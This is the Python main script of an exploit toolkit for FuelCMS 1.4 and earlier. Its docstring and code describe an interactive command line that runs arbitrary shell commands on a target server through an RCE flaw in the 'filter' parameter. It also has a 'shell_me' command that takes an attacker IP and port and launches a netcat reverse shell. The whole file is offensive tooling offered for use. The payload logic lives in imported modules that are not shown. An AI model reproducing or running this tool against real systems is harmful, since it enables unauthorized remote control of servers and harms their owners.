#!/usr/bin/env python3
"""
Main entry point for the FuelCMS RCE Exploit toolkit.

Provides an interactive CLI to execute arbitrary commands on
vulnerable FuelCMS <= 1.4 installations by exploiting the RCE
vulnerability in the 'filter' parameter.

Usage:
    python3 main.py <TARGET_IP>

Features:
- Execute shell commands remotely.
- Launch a reverse shell via netcat.
- Help menu with usage instructions.

Author: Ac1d (modular adaptation)
"""

import sys
from modules.colors import col
from modules.banner import banner, help_menu
from modules.exploit import Exploit


def main():
    """
    Entry point for the CLI exploit tool.

    Prompts the user for input and dispatches commands to the appropriate
    handlers.

    Returns:
        None
    """
    print(banner())
    print(help_menu())

    if len(sys.argv) != 2:
        print("\nUsage: python3 main.py <TARGET_IP>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit(target_ip)

    try:
        while True:
            cmd = input(col.LIGHT_WHITE + "fuelCMS$ " + col.RESET).strip()

            if cmd.lower().startswith("exit"):
                print(col.RED + "Exiting..." + col.RESET)
                break

            elif cmd.lower().startswith("shell_me"):
                ip_port = input(
                    col.LIGHT_BLUE
                    + "Enter your attacking machine IP:PORT $ "
                    + col.RESET
                )
                try:
                    lhost, lport = ip_port.split(":")
                    cmd = exploit.generate_reverse_shell(lhost, lport)
                    print(
                        col.LIGHT_GREEN
                        + "\nHope you had your listener ready!!"
                        + col.RESET
                    )
                except ValueError:
                    print(col.RED + "Invalid format. Use IP:PORT" + col.RESET)
                    continue

            elif cmd.lower().startswith("help"):
                print(help_menu())
                continue

            exploit.run_command(cmd)

    except KeyboardInterrupt:
        print(col.RED + "\nExiting..." + col.RESET)
    except Exception as e:
        print(col.RED + f"An error occurred: {e}" + col.RESET)


if __name__ == "__main__":
    main()
